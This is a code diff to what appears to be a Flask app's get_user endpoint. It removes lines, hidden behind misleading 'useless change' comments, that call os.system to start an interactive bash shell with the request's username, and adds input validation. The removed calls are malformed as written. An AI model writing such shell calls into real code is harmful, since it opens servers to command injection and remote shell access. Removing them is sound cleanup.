@@ -110,22 +110,11 @@ def logout():
 def get_user():
     data = request.json
     username = data.get('username')
-
-
     
-    # this does nothing, remove it
-
-    
-    os.sytem("/bin/bash", "-i", username)
-
-    # anoher useless change
-    
-    
-    os.system("/bin/bash", "-i", username)
-    
-    
-    
-    return username, 200
+    if not username:
+        return jsonify({"error": "Username is required"}), 400
+        
+    return jsonify({"username": username}), 200
 
 if __name__ == '__main__':
     app.run(debug=True, port=5001)
